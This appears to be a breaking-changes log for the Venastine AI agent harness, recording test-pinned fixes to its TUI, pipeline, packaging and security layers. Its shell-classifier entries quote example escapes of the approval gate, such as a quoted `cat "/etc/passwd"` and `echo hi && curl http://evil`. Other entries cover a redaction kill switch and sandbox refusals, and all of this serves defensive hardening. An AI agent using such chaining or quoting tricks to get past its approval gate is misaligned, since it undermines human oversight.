| Credential-shape redaction joins vendor tokens (#167) | Output containing `password "..."`, `<password>...</password>` or `scheme://user:pass@host` now reads `[REDACTED]` in that value | Shapes are OUTPUT-ONLY (input refusals keep vendor tokens alone — pinned); placeholders/short values/non-password keywords survive; three mutations sighted |
| New kill switch: `config.REDACT_TOOL_OUTPUTS` + `VENASTINE_REDACT_OFF` | An environment or constant that used to do nothing now disables output redaction | Env can only turn it OFF; depth cap, input refusals and logging_setup's formatter stay unconditional — each pinned |
| `compact()`'s empty-summary outcome is `status="failed"`, `kind="compaction_failed"` (#136) | Anything switching on `status == "empty-summary"` or expecting `kind is None` | Aligned with COMPACTION_OUTCOMES' own vocabulary; `/compact` renders text only |
| The loop LATCHES on `compaction_failed` (#136) | A turn whose compaction failed once no longer retries on later steps — by design; next turn retries fresh | Spend pins assert `call_count == 1`; cheap outcomes deliberately not latched, pinned at 3 calls |

Count 2241 -> 2272.

## Batch 21 -- the twenty-first fix batch: the human surface (2026-08-23)

Five production contracts changed, all on the consent/answer side of the TUI.
Every mutation below was run RED against its reverted line before its commit
landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| One timeout callback for all six asks (#107) | A test asserting the old per-kind messages or silence-on-race | QUESTION's no-answer line is now true ("the model was told nobody answered"); every kind acknowledges an answer that landed just after the timeout; review's two strings byte-identical, pinned |
| Every modal centred + bounded at 80x24 (#112) | A test pushing a modal and reading its region | ReviewScreen had NO rules; four screens sat top-left; claims was 96 wide on 80 columns. The viewport test pushes all nine (+signoff-empty) asserting containment/centring/border/background -- a tenth screen needs its rules or it goes red |
| /goal read+clear do not construct a thread (#113) | A test expecting app.memory on those paths | Bare /goal and /goal clear answer "No goal set." without persisting a kind=chat row; only setting a goal builds one |
| ask_user refuses options-less AND textless questions (#114) | A tool call with `{"allow_text": false}` and no options | New shape refusal, checked before reachability; the pre-existing affordance probe now supplies options |
| /copy all is a superset (#140) | A test asserting the transcript-only payload | Adds `## Report` and `## Claims` sections (claims JSON identical to /copy claims); empty sections omitted; no-run payload unchanged |

Count 2272 -> 2309.

## Batch 22 -- the twenty-second fix batch: unit 10, the pipeline periphery (2026-08-23)

Five production files changed. Every mutation below ran RED against its reverted line
before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| Chart/PDF failure is contained AND named (#81) | A test asserting silent degradation | `fig = None` before the try (the old guard inverted into UnboundLocalError pre-bind); every degrade path in BOTH helpers warns naming helper+cause; import guards Exception-wide; the module docstring that reasoned "no graceful-degradation test needed" is rewritten |
| Pass-thread classification trusts the record before the clock (#82) | Tests asserting pure window behaviour on modern runs | Two tiers: ids from populated `pass_threads_json` relabel outright (even from abandoned runs); only absent/NULL/empty/corrupted rows fall back to the time window -- a pre-T2 set that cannot grow, so a concurrent session's chat thread is safe. Corrupted JSON warns naming the run. The unfinished-run guard now lives in Python and HAS a red test (it never could under `x <= NULL`) |
| A repeated synthesis finding reaches the human once (#85) | Tests feeding duplicate synthesis findings through consent | Synthesis dedupes on `(claim_id, kind, proposed.strip())`; claim-level kinds keep `(claim_id, kind)`. A stray claim_id is STRIPPED, kept, and the strip traced; the duplicate trace sentence no longer claims "same claim and kind" where there is no claim |
| CODE_STAGES deleted (#84) | Nothing -- it had no consumer | The why-stages-not-passes rationale moved onto the `stage` entry of PIPELINE_EVENT_KINDS |
| Periphery pins + one removal (#86) | -- | Six properties pinned (status-guard, pass_threads NULL default, V1 input, V5 re-target, candidates basis, unconditional pass_threads.json); missing-kind-column guard tested; the `getattr(run, "pass_threads", [])` fallback REMOVED -- no caller or double lacks the field |

Count 2309 -> 2328.

## Batch 23 -- the twenty-third fix batch: the first run (2026-08-23)

Three production files changed. Every mutation below ran RED against its
reverted line before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| providers.json is overridable, and its absence says so (#24) | Tests asserting the old "Unknown provider: X" / "Provider 'X' not found" strings | `AGENT_PROVIDERS_FILE` joins the four sibling env overrides (import-time constant, monkeypatchable); api_initialization distinguishes file-absent (names path + remedy) from provider-absent (names the configured set); load_credentials mirrors through the same two builders. ValueError TYPE unchanged -- callers catch the type |
| Launch says what /model says (#138) | Tests driving main() with exact stdout in a dir without providers.json | One warning pass before either shell starts, gated off --memories/--forget; TUI receives the warnings as data (`VenastineApp(startup_warnings=)`, written at mount -- a pre-mount print would vanish under Textual's screen). Warn-only everywhere; README gains the copy line it never had |
| A CLI --ref stores the label /ref always did (#171) | Tests calling attach_cli_refs without a thread_preview double | storage.thread_preview() is new public API and on STORAGE_SYMBOLS, so the fake_storage fixture redirects it automatically. Rows written by older CLIs keep "(no preview)" -- no backfill, deliberately |

Count 2328 -> 2346.

## Batch 24 -- the twenty-fourth fix batch: unit 14a, the app (2026-08-23)

Two production files changed (`tui/app.py`, `agents/tui_commands.py`). Every
mutation below ran RED against its reverted line before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| /grill-me is attended and assembles its own prompt (#109, #170) | Tests calling `run_one_shot(system_prompt, message)` | Signature is now `run_one_shot(agent, message)`: the method owns channel construction, catalog facts via `advertisement_facts`, the goal/refs/todos tiers, and the skills fragment -- prompt facts and run facts are one answer. `_cmd_grill` delegates. NO with_memories by design; test doubles in test_agents/test_skills updated |
| Quitting mid-run abandons the pipeline (#105) | Nothing external | `_forwarding(app, events, outcome)` breaks on `_shutting_down`, closes the generator (§22 abandoned), and work() reports `ResearchFinished(..., abandoned=True)` instead of writing artifacts or "pipeline failed". `_consume` deliberately untouched |
| `ResearchFinished` gains `abandoned` keyword | Positional callers unaffected | Fourth parameter, default False; a quit is not a failure and gets its own transcript line |
| exit() narrates, timeout narration goes silent after shutdown (#105 D4) | Tests asserting exact transcript at exit with a modal up | The busy warning is best-effort: under a modal there is no #transcript to write to (§27), hence NoMatches caught. `_timed_out_ask` returns early once `_shutting_down` -- post-quit narration described an app that had closed |
| `_shutting_down` is a class attribute default False | Bare-instance seams | Three test files build VenastineApp via __new__ for callback logic; instance-only assignment made the new reader raise there |
| Twelve coverage pins (#110) | Mutations only | Zero production changes were needed -- even /copy's unknown-target check already existed. Each pin's mutation listed in DEVLOG |

Count 2346 -> 2363.

## Batch 25 -- the twenty-fifth fix batch: effort reaches the pipeline (#139) (2026-08-23)

Four production files changed (`core/reasoning/orchestrator.py`,
`core/reasoning/json_retry.py`, `core/reasoning/review.py`, `main.py`) plus
the config surfaces (`config.py`, `core/config_loader.py`, `tui/app.py`).
Every mutation below ran RED against its reverted line before its commit
landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `effort` keyword on six pipeline functions | Tests calling them positionally past the old tail are unaffected (keyword with default); tests asserting EXACT forwarded kwargs must add `effort=None` | `stream_deep_research_pipeline`, `run_deep_research_pipeline`, `_run_pass`, `_run_pass_with_json_retry`, `_review_stage`, `retry_until_json`. Threaded like authorization; test_e2e's exact-kwargs pin updated |
| review.py inherits effort (D4/V7) | Nothing external | `run_review`, `walk_consent`, `_decide_one`, `_refine` take and forward it |
| `--effort LEVEL` CLI flag + top-level settings.json `"effort"` key | Exact-argv parsers unaffected; `_KNOWN_SETTINGS` grew a key so an unknown-key test listing keys may need updating | Free string, not choices= -- the chokepoint validates. `resolve_effort(args, settings)` mirrors resolve_attended's None-default mechanism; "auto" is the explicit off switch at either layer |
| `config.DEFAULT_EFFORT` is now `"high"` (owner decision amending §16's silence-is-safe note) | Any test asserting the old None default; any exact-kwargs assertion on paths that now forward "high" | Known non-reasoning OpenAI models ship in MODEL_EFFORT_LEVELS mapped to [] (authoritative empty -> dropped cleanly). Unlisted endpoints fail loud; `--effort auto` reverts |
| TUI mount probes only NAMED efforts (`_effort_named`) | Tests asserting a probe for every mount | A default-derived level validated at call time instead -- probing it fired fallback WARNINGs on every launch and broke #138's healthy-mount silence (found by the suite going racy: process-global logging landed one app's warnings in another app's transcript) |

Count 2363 -> 2381.
## Batch 27 — the spend meter stops being a size limit (#4) (2026-08-24)

| Change | What breaks | Symptom / fix |
|---|---|---|
| Wrapper defaults: `max_total_tokens` is now `_SPEND_UNSET` on all four entry points | Any caller or test assuming the old `config.MAX_TOKEN_BUDGET` (250k chat / 1M pass) default now runs UNCAPPED unless settings.json sets `max_token_budget` | Deliberate (#4, owner decision). Explicit `None` still means genuinely uncapped — only the sentinel resolves settings. `test_spend_and_size.py::TestUncappedByDefault` pins both halves |
| `config.MAX_TOKEN_BUDGET`, `RESEARCH_PASS_TOKEN_BUDGET`, `INIT_TOKEN_BUDGET` deleted | `AttributeError` on any remaining reference | Production refs rewritten (orchestrator reviewer/retry, project_init, TUI direct `_run` call via `config_loader.spend_cap()`); ROADMAP.md's locked §1/§3 spec sketches still name the constant and are superseded, not edited |
| New top-level settings.json key `max_token_budget` (int \| null) | Unknown-key tests listing `_KNOWN_SETTINGS` may need updating; a wrong-typed value raises at load with "must be an int or null" | Cost knob, effort's merge rules. `spend_cap()` in config_loader is the single resolution point |
| `ModelResponse.turn_billed_tokens` / `.turn_new_tokens` (new fields, None until set by `_run()`) | Dataclass equality unaffected (both sides default None); exact-kwargs response assertions that construct expected objects gain nothing to change | Set per step by `_run()`; unpriced counts. `conftest.make_model_response` accepts both kwargs |
| `effective_compaction()` headroom advisory fires ONLY when a cap is configured | Tests asserting the advisory against the old unconditional budget (`test_compaction.py`) needed cap-configured mocks | Uncapped means nothing competes with compaction; the warning text names `max_token_budget` |
| TUI sidebar gains `UsageLine` (id `usage-line`); memory setter resets it | The batch-26 no-literal guard applies to its styling too (`system` role, not `style="dim"`) | Hidden until first turn; thread-since-resume billed · ctx; reset on every memory swap |

Count 2400 -> 2419.

## Batch 35 — the npm channel (2026-08-27)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `env_secrets.load_dotenv()` gains `find_dotenv(usecwd=True)` and an `AGENT_ENV_FILE` override | Reverting it re-breaks `.env` for every install where the harness does not sit in the working directory — which is every npm install and no checkout | `test_the_env_file_is_found_from_the_working_directory` and `test_agent_env_file_overrides_the_working_directory` in `test_credentials.py` -- both verified RED against the bare call before the fix. Note the pin must run a script FILE: under `python -c`, dotenv's `_is_interactive()` is true and sends resolution down its `os.getcwd()` branch, so a `-c` version passes against the bug. The bare call walks up from **`env_secrets.py`'s own directory**, so in a checkout it looks like cwd resolution and is not. Measured before the fix: a `.env` in cwd, harness imported from elsewhere, `get_env_secret()` saw `None`. Do not "simplify" the call |
| `credentials.no_providers_message()` names `os.getcwd()` only when the path is relative | A test matching the literal `"was not found in"` against an ABSOLUTE `AGENT_PROVIDERS_FILE` now fails — the clause is deliberately absent there | `test_an_absolute_providers_path_does_not_name_a_directory_it_never_checked`. Both existing matchers use a relative default and are unaffected. An absolute path is the whole answer already; naming cwd beside it sent the user to create the file in a directory the code never looked in |
| `package.json` `files` is an allowlist, not `.npmignore` | Deleting the key does not fail loudly — npm silently falls back to `.gitignore`, at which point `providers.json` is excluded by accident rather than decision, and a future `.gitignore` edit could expose it | `test_the_npm_allowlist_cannot_ship_a_secret`. The `!**/__pycache__`, `!**/*.pyc` and `!**/.ipynb_checkpoints` guards are required: directory entries sweep in whatever is inside them, and this tree really does contain a checkpoint copy of a prompt module |
| `package.json` `version` duplicates `pyproject.toml`'s | They drift, and npm cannot replace a published version — only deprecate it | `test_the_npm_package_and_pyproject_state_the_same_version`, plus `scripts/prepublish-check.mjs` at publish time. Bump both |
| `bin/venastine.mjs` must never assign `env.PYTHONPATH` or `env.AGENT_WORKSPACE` | Setting either looks reasonable and breaks something quietly: `tools/isolation.py` computes its child's `PYTHONPATH` from the parent's resolved `sys.path`, and `WORKSPACE_DIR` is the `file_ops` auto-approval boundary, not a storage path | `test_the_launcher_never_sets_the_two_variables_that_would_break_it`. `AGENT_WORKSPACE` is the live trap — it is the obvious next move after seeing `APP_DB_PATH` redirected two lines above, and it would auto-approve writes into a shared home directory from every project |
| The launcher sets `APP_DB_PATH` **and** `AGENT_LOG_FILE` together, on one condition | Splitting the condition gives a global database writing to a local log, which is worse than either arrangement | One `useGlobalState` test, both assignments under it. An existing `./app.db` always wins, so the launcher run inside a checkout uses that checkout's data |
| `.github/workflows/publish.yml` has three brakes (no push/tag trigger, `dry_run` default true, no `NPM_TOKEN`) | Removing any one of them moves the project closer to publishing before the repository is public — which publishes the source regardless of repo visibility, irreversibly | Not test-pinned; it is a workflow file, and `CONTRIBUTING.md` + `AGENTS.md` § *Distribution* record why each brake exists. Uncommenting the tag trigger is the deliberate act of arming the channel |

Count 2623 -> 2630.
## Batch 37 — the shell classifier and the workspace mount (2026-08-28)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `_SHELL_METACHARACTERS` rejects `'` and `"`, so a quoted command is never `INERT` | A test asserting a quoted argument stays inert now fails. Exactly one did: `test_dangerous_flags_rejected`'s `_is_inert("find . -name '*.py'") is True` | Intentional tier change, not a regression in the flag denylist — the line above it now tests the same thing unquoted. Reverting reopens the hole: the classifier splits on whitespace and `_run_inert` splits with `shlex`, which STRIPS quotes, so `cat "/etc/passwd"` was one token inside the workspace at classification time and two tokens naming the host's file at exec time. Pinned by `TestQuotingCannotHideAnEscape`, whose last test asserts the invariant over a corpus rather than the three spellings that were found |
| `run_sandboxed` refuses a workspace that overlaps the harness | A test calling `run_sandboxed` with the repo root, or with `~/.config/venastine`, now raises `SandboxUnavailable` instead of running | Use `tmp_path`, which every existing test already does. The check sits ABOVE audit #50's `makedirs`, so a refused workspace is not created either |
| `AGENT_WORKSPACE` overlapping the install tree is a startup failure (exit 2) | A launch configuration that pointed the workspace at the harness itself stops working | `main.py` prints the reason and names `./workspace`. The refusal set is narrow by design: `<harness>/workspace` and `<harness>/output` stay allowed, and a *nested* protected path is read-only-bound rather than refused |
| `security/` now imports `credentials` | The "imports `config` and the stdlib, and nothing else" rule in `ARCHITECTURE.md` had to be amended rather than quietly broken | `credentials` is a leaf (`json`, `os`) so there is no cycle. `logging_setup` was NOT imported for the same purpose — it pulls in `safety.policy_enforcement` — so the log path is re-derived and pinned by `test_the_log_directory_matches_logging_setup` |
| `test_a_refused_workspace_is_not_created` asserts against `os.makedirs`, not the filesystem | Rewriting it to check `os.path.exists` makes it pass or fail on what an earlier run left behind | It did exactly that during this batch's mutation testing: the mutation that removes the refusal let `makedirs` through, the real directory it created then failed the test under every LATER mutation, and five kills were scored that were actually one. A test that writes into the tree it is defending cannot be run twice |

Count 2642 -> 2686.

## Batch 38 — live output: progressive rendering and visible thinking (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| The Anthropic branch iterates the `MessageStream` instead of `stream.text_stream` | Every double shaped as `class _S: text_stream = [...]`. Two files had one: `test_client_streaming.py::_FakeAnthropicStream` and `test_client_translation.py::_stream_anthropic`'s local `_S` | `TypeError: '_S' object is not iterable`, raised from inside the `with client.messages.stream(...)` block — so it reads as a client-construction fault rather than a fake-shape one. Give the double an `__iter__` yielding `SimpleNamespace(type="text", text=...)`, and `SimpleNamespace(type="thinking", thinking=...)` for reasoning. The real names are pinned in `test_sdk_conformance.py`; a fake that drifts from them is the #35 shape again. The change is not optional: `text_stream` is built in `MessageStream.__init__` from the same underlying iterator `__iter__` walks, so a caller gets text or both kinds, never text plus thinking |
| `LoopEvent` has an eighth field, `thinking_delta` | `test_pipeline_events.py::test_loop_event_did_not_grow_an_eighth_field`, by design — that test exists to make this decision explicit | Renamed to `..._a_ninth_field` with the argument recorded in its docstring (§38 O4): P1 rejected the §22/§23 kinds because those describe a ten-pass RUN; a thinking delta is `token_delta`'s family. **Do not just widen the set** if a future field appears — the test working means stopping to write down why |
| `Transcript.stream_delta` now draws | A test asserting nothing is on screen until `flush_stream()`, or one counting `write` calls per turn | None existed. If one appears, it is asserting the defect: the widget's own docstring described this behaviour for two sections as a known cost |
| A streamed answer's `_entries` row is written once and then UPDATED | Code appending to `_entries` per committed chunk | `as_text()` would split one answer across its `\n\n` joins and `rerender()` would draw a `venastine ›` label per fragment. Pinned by `test_live_output.py::TestTheEntryLogSurvivesChunking` |
| `role_styles` gained a `thinking` slot | `test_themes.py::EXPECTED_ROLE_KEYS`, and any theme added without it | `assert set(styles) == EXPECTED_ROLE_KEYS` fails naming the theme. The slot must be non-empty — `assistant` is the one deliberately unstyled role |
| `test_docs_consistency.py`'s runtime-string anchor is computed, not hardcoded | Nothing; it was already wrong | It asserted `979 not in orch` while the real `yield from _stage("D0")` had drifted to 1059, so it was passing on a blank line and testing nothing. It now locates the line by content and fails loudly if that string disappears. A hardcoded line number in a test about drift is the one place it cannot be excused |
| `_render_blocks` drops a trailing newline and the structural newlines either side of a fence | A test asserting the exact ROW COUNT of a replayed or one-shot answer. None existed | Rich renders a trailing newline as an extra empty row, so a replayed answer carried blank lines the live stream never drew -- and `rerender()` replays through this path, so a `/theme` mid-session reflowed the transcript it was only meant to recolour. Found by rendering the same text both ways and diffing the rows, not by a test; `test_live_output.py::TestAStreamedAnswerRendersLikeAWrittenOne` is that diff, pinned |
| `Transcript._wrap_width` reproduces RichLog's own width rule | Nothing yet | `RichLog.write` shrinks to `scrollable_content_region.width` and then raises the result to `min_width` (78 by default), so in a sidebar-narrowed transcript the min_width is what decides the break. The first implementation guessed `content_size.width - 1` and wrapped streamed answers ~15 columns narrower than replayed ones. If a future textual changes that computation, this function has to follow it, not approximate it |

Count 2686 -> 2742.

## Batch 39 — the escaping bypass, and the first word of a compound command (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `\` joins `_SHELL_METACHARACTERS`, so a command containing one is never INERT | `_is_inert(r"cat sub\dir\notes.txt")` is now `False`. **On Windows this is a real regression, not just a tier change** | The spelling works today on the inert path (measured: `rc=0`, 302345 bytes back) because `_run_inert` uses `shlex.split(posix=False)` there and MSYS2's `cat` accepts backslash separators. It now classifies SANDBOXED and runs `bash -c` in a Linux container, which strips the backslashes: `cat: testsBREAKING_CHANGES.md: No such file or directory`. **Use forward slashes** — they work on Windows for every `INERT_COMMANDS` binary, most of which are Git-for-Windows builds. The failure is loud, and the trade is priced in §39 Q1: the alternative was a platform-conditional character class, which would have weakened batch 37's `posix=True`-everywhere invariant one day after it was locked |
| `_needs_network` takes a second argument | Every direct caller. `tests/test_shell.py::TestNeedsNetwork` had seven | `TypeError: _needs_network() missing 1 required positional argument: 'first_word_only'`. The flag is not a caller preference — it is `_is_inert`, and `classify_command` is the only production caller. Pass `False` for anything that could chain, `True` for a command already known inert |
| A non-inert command's ARGUMENTS can now request network | `test_keyword_in_args_does_not_grant_network`, which pinned the opposite rule and is gone. Anything auto-approved today that mentions a `NETWORK_ALLOWED_COMMANDS` word will start prompting | The deliberate reversal (§39 Q2). `echo hi && curl http://evil` was auto-approved on the strength of `echo` and ran under `--network none`; it now asks, and gets real network on approval. `python script.py # pip` is the priced false positive: the `#` makes it non-inert, so the scan reaches a word in a comment. Stripping comments would be parsing, which G2 forbids |
| Inert commands are exempt from that scan | A future "simplify: why does this take a flag at all?" edit | Deleting the carve-out makes `grep pip notes.txt` and `grep git notes.txt` prompt. An inert command carries no metacharacters, so it cannot chain — its first word is its only command position. Pinned by `TestChainingCannotHideBehindTheFirstWord::test_an_inert_command_is_unchanged` |
| `_within` returns `False` instead of raising on an unresolvable path | Nothing; it was an unhandled crash | `os.path.realpath` raises `OSError: [WinError 668]` on a malformed UNC token such as `\\;` on Windows, and `ValueError` on an embedded NUL (`a\0b`) on POSIX — neither fires on the other platform. `_within` runs inside `classify_command` → `registry.approval_needed()`, which is handed the model's tool input verbatim and has no handler above it. So `ls \\;` crashed the approval gate. The `except` must stay narrow: a bare `except` here reads every token as escaping and turns the whole inert tier into a prompt |
| The tokeniser-agreement invariant is generated, not enumerated | Nothing, but do not "simplify" it back to a list | Batch 37 wrote `test_the_classifier_and_the_executor_agree_on_every_token` with the right docstring — "over a corpus rather than over the three spellings that happened to be found" — and eight hand-written spellings underneath it, none containing a backslash. It passed for a day over the one character that broke it. The replacement generates from an alphabet containing everything shlex treats specially, and found `\\;` (Q3) on its first run |
| The generative corpus asserts on its own yield | A change to `INERT_COMMANDS`, or to the alphabet, that stops the corpus reaching the INERT tier | `assert seen_inert > 100` fails with the count. It is there because the first draft generated uniformly random strings whose first word was essentially never an inert command name, so every sample classified SANDBOXED and the test passed while measuring nothing — the vacuity class, caught by writing the guard before trusting the green |

| `TestTheGateAnswersForEveryString` pins the contract, not a token | A test that asserts `_within` is False for a specific spelling on every platform | `\\;` is a malformed UNC path on Windows and an ordinary relative filename on POSIX; `a\0b` is the reverse. Neither triggers the guard on both, so a token-based assertion is red on one platform and, worse, can be GREEN on the other for an unrelated reason — `\\?` passed on Windows because it is UNC-absolute and escapes, not because the guard fired. Pin the contract by patching `realpath` to raise; `skipif` the real triggers with the reason in the marker |

Count 2742 -> 2786.

## Batch 40 — the security posture is bound once (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", …)` no longer changes anything | Every test that set a security flag that way — 23 call sites across `test_shell.py` (21) and `test_policy_enforcement.py` (2) | The test does not error; it **passes the wrong thing** or fails on an unrelated assertion, because the flag is now read once at import. Use `set_posture(monkeypatch, shell_approval_mode="never")` from `tests/conftest.py`. That those call sites worked at all was the defect: they relied on the live read that §40 removed |
| `VENASTINE_REDACT_OFF` is read once, not per call | Any test that sets the env var and expects `redaction_enabled()` to follow | Use `rebind_posture(monkeypatch)` **after** the `setenv`, which is what a real process does at startup. This was the one security setting with an environment input, and it was live — `os.environ[...] = "1"` was an in-process switch for credential redaction |
| `_needs_network` / `containment_for` / `redaction_enabled` read `security.posture` | Code or tests that patched `config` to steer them | Patch the posture instead. `config.py` is still where a human writes the value; it is no longer what is read when a decision is made |
| **No module may read the posture at IMPORT time** | A module-level `posture.current()` anywhere in production code | Every launch dies in `apply_cli()`'s ordering guard with "would CHANGE the posture after it had already been read", because `main()` runs after every import. `tools/builtin/shell.py` hit this in the first draft — its import-time approval-mode validation now reads `config` directly, and `test_posture.py::test_no_module_reads_the_posture_at_import` scans for it |
| `apply_cli()` raises on a CHANGE after a read, not on a read | Nothing today; it is the shape a future caller must respect | Raising on the read alone was the first draft, and it made `main()` un-callable twice in one interpreter — which the suite does constantly. If you tighten this back, expect ~16 `test_cli.py` failures that have nothing to do with what you were testing |
| `scripts/prepublish-check.mjs` refuses an unsafe-mode tree | `npm publish` / `npm pack` from a branch carrying `UNSAFE_BRANCH` or a `config.py` declaring `UNSAFE_NO_*` | Intended (UN5). The guard lives on `main` so it travels into the branch by merge and also catches the reverse accident — unsafe code merged into main and published from there, which is the unrecoverable direction |
| A source-scan assertion must ignore commented-out lines | `test_the_publish_guard_is_wired_into_the_prepublish_check`, and any test written the same way | The first version asserted `"problems.push(...unsafeBranchProblems());" in src` and **survived the mutation that comments that exact line out**, because the substring is still there. Scan live lines only. Found by running the mutation, not by reading the assertion |

Count 2786 -> 2815.

## Batch 42 — the consent surface (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| Every non-literal renderable in `tui/screens.py` is wrapped in `Text(...)` | Any test reading a modal's content back off the constructor argument, and any new screen added without the wrap | `test_every_renderable_built_from_a_non_literal_is_wrapped` fails with the offending `(widget, lineno)` pairs. **Do not "simplify" it to `markup=False`** — on textual 1.0.0 that flag is stored by `__init__` and never read by the `visual` property, so it silently does nothing and the modal still raises. Measured |
| The `permission_request` LoopEvent and the APPROVAL `Request` payload carry a `rationale` key | Any test asserting the whole dict — `test_streaming_loop.py` had one | `assert perm[0] == {...}` fails with an extra key. That test asserts the WHOLE dict on purpose and that is why it caught this; add `"rationale": None` rather than loosening it to a subset check. Present-and-None for a tool with no `rationale_param`, so a shell need not tell "this tool has no rationale" from "this build predates the field" |
| `param_digest(params)` is now `param_digest(params, omit=())` | Nothing — the parameter is optional | But **call `registry.call_digest(tool_name, params)` instead** unless you are writing a test about `param_digest` itself. The three production consumers moved; a fourth going direct would silently print a tool's rationale into a line sized for a command |
| `PermissionScreen.__init__` and `ask_permission_blocking` take a trailing `rationale` | Positional callers passing four arguments | Both default to `None`, so existing three-argument calls are unchanged. A test constructing the screen directly gets no rationale and shows `(none given)` |
| A `PermissionScreen` built directly cannot detect a break in `core/loop.py`'s wiring | Nothing today — it is why `test_the_loop_carries_the_reason_to_whoever_is_asked` exists | Measured, not assumed: replacing `registry.rationale_for(...)` with `None` in the loop left every modal test green. If you add a display assertion, add it beside a test that drives `_run()`, or it is a claim about a constructor rather than about the app |

## Batch 41 — the transcript's vocabulary (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `LogRecordMessage(text, is_error)` is now `(text, role)` | Any test patching `Transcript.write_system` or `write_error` to observe a routed log record — `test_tui.py` had three | The test does not error, it goes **vacuous**: `write_system` is simply never called any more, so an assertion that nothing appeared there passes for the wrong reason. That is exactly what `test_info_is_not_routed_to_the_transcript` would have done. Patch `write_role` and assert on the `(role, text)` pair |
| `role_styles()["warning"]` is `bold {warning}`, not `{warning}` | Any caller composing its own weight on top | `GoalBanner` did, and produced `bold bold #d9a441` — Rich accepts it, and `test_a_theme_switch_restyles_the_goal_banner` compares the style string exactly, so it fails with a readable diff. Use the role verbatim; the weight is the role's decision now |
| `dark-plain`'s accent is `#b8c1d1`, not `#a9b2c3` | A test pinning that hex, and anything reading `$accent` in `app.tcss` expecting the old value | Intended (X1). It is the accent's turn at batch 29's #14 treatment, on a different axis: #14 measured contrast against the background, this measures separation from `secondary`, which is what `thinking` and `pass_done` render in. `tests/test_themes.py::test_a_tool_call_is_visibly_apart_from_a_reasoning_line` is the pin |
| The checklist marks moved to `tui.widgets.MARK_*` | Any assertion spelling a marker literally — there were seven, across `test_todo.py`, `test_pipeline_events.py` and `test_research_legibility.py` | `assert "x Pass 0" in text` fails with the rendered panel in the message. Import the constant and use an f-string; do not re-spell the glyph, or the next change to the vocabulary breaks the same seven assertions again |
| A test asserting a marker against `MARK_*` cannot detect a change to `MARK_*` | Nothing today — it is the reason `test_the_checkbox_marks_are_the_ballot_box_family` exists | The panel assertions now say "the panel uses the shared vocabulary", which is the right claim for them and is **not** a claim about which glyphs those are. The codepoints are pinned separately, by value. If you change a mark, that is the test that should go red, and it should be a decision |
| `ResearchProgress`'s failed row is `☒`, not `✗` | A test or doc claiming the panel shares the transcript's failed-tool glyph | Intended (X3). E14's actual constraint — a row that ended badly must not share a glyph with one that finished — is unchanged; what changed is that the three pass outcomes are now one visual family. The transcript's `✗` for a failed tool call is untouched |
| `policy_enforcement._redact_output_text` is now `redact_output_text` | Anything importing the private name — nothing did outside the module | It went public for the §41 diff (X4). If you are redacting something a tool PRODUCED, this is the function: `redact_secrets` is the vendor tokens only, and the three credential shapes (#167) live behind this one. Using the narrower call is a silent under-redaction, not an error |
| `file_ops._resolve_path` is now `resolve_path` | Anything importing the private name — `tests/test_file_ops.py` had one | `AttributeError: module 'tools.builtin.file_ops' has no attribute '_resolve_path'`. It went public deliberately (X4): the TUI has to land on the same file the tool will, and a second path computation at the call site would mean a diff of one file beside an edit to another |
| `write` and `edit` no longer print a param digest | A test asserting the tool line for either carries the path or the content | The line is `▸ write` exactly. The digest was the truncated payload the diff replaces, and printing both would put 60 characters of `old_text` directly above a block that says it properly. Every other tool, `read` included, is unchanged — `DIFFED_TOOLS` is the list |
| `Transcript._entries` can hold a `"diff"` role | Anything enumerating the roles it expects, or `as_text()` callers assuming a label per entry | `diff` is deliberately unlabelled in `as_text()`: the canonical block opens with the path, so a label would name the file twice. The entry's text is the block, parseable with `tui.diffs.parse` |
| A diff row must be padded AND written with an explicit `width=` | A "simplify: why not just `self.write(Text(...))`?" edit to `_write_padded` | `test_a_changed_row_is_marked_across_its_whole_width` goes red. RichLog raises a short row to `min_width` and `Strip.adjust_cell_length` pads the tail with an UNSTYLED segment, so the background stops at the last character of the source line. Dropping the pre-wrap fails the same way one row down: Rich's soft wrap styles each row but pads only the widest, measured at 78/75/78/66 cells |
| A new `diff_*` role needs two floors, not one | Adding a role that sets a background, or retuning `DIFF_TINT` | Foreground readable on the tint (≥ 4.5:1) **and** the tint visible against the page (≥ 1.15:1). The second is the one that binds: blending further toward the background improves the first monotonically while erasing the band the feature exists to draw, so a readability floor alone is satisfied by removing the feature |
| A new transcript role must clear three checks, not one | Adding a role to `MESSAGE_ROLES` in `tests/test_themes.py` | Pairwise-distinct style strings, a redmean separation of ≥ 120 from the roles it sits beside, and no `dim` unless it is `system`. If a role legitimately needs `dim`, say why in `test_dim_is_the_system_role_alone` rather than widening the exception silently — the whole point is that neither of the other two checks can see it |

## Batch 44 — the provider it is on, the reasoning it kept, and the project it is in (2026-08-31)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `VenastineApp.__init__` and `tui.app.run()` no longer take `startup_warnings` | Any caller passing it — `main.py` and two tests in `test_tui.py` | `TypeError: unexpected keyword argument 'startup_warnings'`. The app computes its own from `provider_startup_issues(self.provider_name)` after the §43 restore, which is the only place the resolved pair is known. **Do not re-add the parameter as an injection point for tests**: arrange `providers.json` instead (there is a `_providers_file` helper in `test_tui.py`). A test that hand-writes the warning string never asks the app which provider it is about, which is exactly why the defect shipped green |
| `tests/conftest.py` has a new autouse `isolate_provider_check` | Nothing today; it is why nothing goes flaky | The mount path READS `providers.json` now, so without it `test_a_healthy_mount_adds_no_warning_lines` passes or fails depending on whether the developer has a real ANTHROPIC key. It copies the real file with the keys filled and LEAVES THE PATH ALONE when the file is absent, so the twelve fresh-clone failures AGENTS.md documents stay real. `test_cli.py`'s `startup` fixture opts back out by name, because those tests chdir into an empty directory precisely to be a fresh clone |
